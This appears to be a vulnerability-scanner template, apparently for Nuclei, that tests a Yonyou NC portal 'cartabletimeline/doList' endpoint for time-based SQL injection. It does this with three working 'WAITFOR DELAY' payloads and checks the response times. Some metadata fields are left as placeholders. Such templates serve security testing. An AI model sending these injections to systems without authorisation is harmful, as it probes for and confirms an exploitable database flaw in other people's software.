id: yonyou-nc-cartabletimeline-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: description
  reference:
    - https://forum.butian.net/article/627
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}//portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:3%27--+"
      - "{{BaseURL}}//portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:6%27--+"
      - "{{BaseURL}}//portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:9%27--+"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"